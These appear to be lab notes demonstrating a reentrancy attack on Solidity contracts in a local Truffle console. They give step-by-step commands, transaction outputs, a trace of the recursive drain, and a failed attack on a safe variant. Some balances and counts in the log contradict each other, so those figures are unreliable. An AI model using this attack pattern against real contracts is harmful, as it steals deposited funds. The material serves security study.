https://solidity.readthedocs.io/en/develop/security-considerations.html
https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
https://github.com/gustavoguimaraes/honeyPotReentranceAttack
http://solidity.readthedocs.io/en/develop/contracts.html
https://ethereum.stackexchange.com/questions/12778/how-to-send-some-amount-to-a-contract-in-truffle
http://truffleframework.com/tutorials/debugging-a-smart-contract

STEP 1 - Check our initial accounts balances
truffle(develop)> Reentrant.deployed().then(instance => honeyPotAddress = instance.address)
'0x9fbda871d559710256a2502a2517b794b482db40'
truffle(develop)> ReentrantAttacker.deployed().then(instance => evilContractAddress = instance.address)
'0x30753e4a8aad7f8597332e813735def5dd395028'
truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
'0'
truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'0'

STEP 2 - Deposit 15 Ethers from a known account to Reentrant instance:
truffle(develop)> Reentrant.deployed().then(instance => instance.deposit({from: web3.eth.accounts[1], value: web3.toWei(15, "ether") }))
If encounter Error: Invalid number of arguments to Solidity function, delete the contracts in .\build directory, compile and migrate again.

{ tx: '0x678ab27b16d2bd023c4b67c0f6f97f08acd22c05ea2b7a2dfb2b69fc7ae84c53',
  receipt:
   { transactionHash: '0x678ab27b16d2bd023c4b67c0f6f97f08acd22c05ea2b7a2dfb2b69fc7ae84c53',
     transactionIndex: 0,
     blockHash: '0x14179027a3d7c2f737cda6bff3a2778997fbfc397f790c5707761b3b02477ea0',
     blockNumber: 10,
     gasUsed: 41527,
     cumulativeGasUsed: 41527,
     contractAddress: null,
     logs: [] },
  logs: [] }
truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
'5000000000000000000'

STEP 3 - Check withdraw count from Reentrant instance:
truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'0'

Check the withdraw count from Reentrant instance:
truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
BigNumber { s: 1, e: 0, c: [ 0 ] }
Reentrant.deployed().then(function(instance){return instance.getWithdrawCount.call();}).then(function(value){return value.toNumber()});

STEP 4 - Now invoke ReentrantAttacker attack function,
by just sending 2 ethers to deposit in Reentrant instance, and immediately calling withdraw from Reentrant instance,
ReentrantAttacker instance can steal Ethers (14) from Reentrant
truffle(develop)> ReentrantAttacker.deployed().then(inst => inst.attack({ value: web3.toWei(2, "ether") }))
{ tx: '0x2fab1eb12ed99c64c6cb7f777f40e2dbf9edd6a56934f7ec5b9c30c109bc9b53',
  receipt:
   { transactionHash: '0x2fab1eb12ed99c64c6cb7f777f40e2dbf9edd6a56934f7ec5b9c30c109bc9b53',
     transactionIndex: 0,
     blockHash: '0xb91201dbb274fb24e23daf0f8dc8df13b58db0b5d70aaabc8b8880a5cccdd57f',
     blockNumber: 15,
     gasUsed: 226227,
     cumulativeGasUsed: 226227,
     contractAddress: null,
     logs:
      [ [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object],
        [Object] ] },
  logs: [] }

STEP 5 - Check the withdraw count from Reentrant instance = 1 + no. of recursive calls
truffle(develop)> Reentrant.deployed().then(instance => instance.getWithdrawCount())
BigNumber { s: 1, e: 0, c: [ 2 ] }
Reentrant.deployed().then(function(instance){return instance.getWithdrawCount.call();}).then(function(value){return value.toNumber()});
8

STEP 5 - ReentrantAttacker instance now has deposit amount + amounts from Reentrant instance
truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'16000000000000000000' !!!

truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
'1000000000000000000' !!!

Points to ponder:
https://ethereum.stackexchange.com/questions/6707/whats-the-difference-between-call-value-and-call-value
http://www.blunderingcode.com/writing-secure-solidity/
https://ethereum.stackexchange.com/questions/7069/whats-the-point-of-sending-a-value-in-a-contract-deployment-transaction
https://ethereum.stackexchange.com/questions/26838/how-to-get-the-creator-of-a-contract-was-the-owner
https://ethereum.stackexchange.com/questions/11484/how-can-contract-ownership-be-transferred-from-one-account-to-another
https://ethereum.stackexchange.com/questions/1020/exception-in-contract-reverts-entire-stack-uses-all-gas
https://ethereum.stackexchange.com/questions/16200/fallback-function-is-not-getting-called

TRACE- Reentrant and ReentrantAttacker
Reentrant has 15
truffle(develop)> Reentrant.deployed().then(instance => instance.deposit({from: web3.eth.accounts[1], value: web3.toWei(15, "ether") }))

truffle(develop)>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
truffle(develop)>  web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'0'
truffle(develop)>  Reentrant.deployed().then(function(instance){return instance.getWithdrawCount.call();}).then(function(value){return value.toNumber()});

ReentrantAttacker attacks with 2
ReentrantAttacker.deployed().then(inst => inst.attack({ value: web3.toWei(2, "ether") }))

ReentrantAttacker             Reentrant      15 Ethers
                       -2     deposit()  +2  17        
                       +2     withdraw() -2  15
fallback() 15>=2       +2     withdraw() -2  13
fallback() 13>=2       +2     withdraw() -2  11
fallback() 11>=2       +2     withdraw() -2  9
fallback() 9>=2        +2     withdraw() -2  7
fallback() 7>=2        +2     withdraw() -2  5
fallback() 5>=2        +2     withdraw() -2  3
fallback() 3>=2        +2     withdraw() -2  1
fallback() 1 ! (>=2)

truffle(develop)> Reentrant.deployed().then(function(instance){return instance.getWithdrawCount.call();}).then(function(value){return value.toNumber()});
8
truffle(develop)> web3.eth.getBalance('0x30753e4a8aad7f8597332e813735def5dd395028').toString(10)
'16000000000000000000'
truffle(develop)> web3.eth.getBalance('0x9fbda871d559710256a2502a2517b794b482db40').toString(10)
'1000000000000000000'

TRACE- ReentrantSafe and ReentrantAttackerFailed
truffle(develop)> ReentrantSafe.deployed().then(instance => honeyAddress = instance.address)
'0xaa588d3737b611bafd7bd713445b314bd453a5c8'
truffle(develop)> web3.eth.getBalance('0xaa588d3737b611bafd7bd713445b314bd453a5c8').toString(10)
'0'
// assign the victim
var honey; ReentrantSafe.deployed().then(function(deployed){honey=deployed;});

truffle(develop)> ReentrantAttackerFailed.deployed().then(instance => evilContract = instance.address)
'0x75c35c980c0d37ef46df04d31a140b65503c0eed'
truffle(develop)> web3.eth.getBalance('0x75c35c980c0d37ef46df04d31a140b65503c0eed').toString(10)
'0'
// assign the attacker
var attacker; ReentrantAttackerFailed.deployed().then(function(deployed){attacker=deployed;});

// track withdraw event on victim, NOTE: on revert() or throw, Ether is returned and no event will be emitted
var theEvent = honey.WithdrawInvoked();
theEvent.watch(function(err, result) { console.log(result.args.count.toNumber()) });

// deposit amount to victim
honey.deposit({from: web3.eth.accounts[1], value: web3.toWei(15, "ether") })
//truffle(develop)> ReentrantSafe.deployed().then(instance => instance.deposit({from: web3.eth.accounts[1], value: web3.toWei(15, "ether") }))

ReentrantSafe.deployed().then(function(instance){return instance.getWithdrawCount.call();}).then(function(value){return value.toNumber()});

// attemp to attack the victim
ReentrantAttackerFailed.deployed().then(inst => inst.attack({ value: web3.toWei(2, "ether") }))
// NOTE: on revert() or throw, Ether is returned and no event will be emitted

ReentrantSafe.deployed().then(function(instance){return instance.getWithdrawCount.call();}).then(function(value){return value.toNumber()});
shows 0 as revert() will rollback all state changes.

IMPROVED
// assign the victim
var honey; Reentrant.deployed().then(function(deployed){honey=deployed;});
// assign the attacker
var attacker; ReentrantAttacker.deployed().then(function(deployed){attacker=deployed;});
// deposit amount to victim
honey.deposit({from: web3.eth.accounts[1], value: web3.toWei(15, "ether") })

// track withdraw event on victim
var theEvent = honey.WithdrawInvoked();
theEvent.watch(function(err, result) { console.log(result.args.count.toNumber()) });

// attack the victim
attacker.attack({ value: web3.toWei(2, "ether") }).then(function(result){console.log(result.logs[0].args.count);});
var log0; attacker.attack({ value: web3.toWei(2, "ether") }).then(function(result){log0 = result.logs[0];});
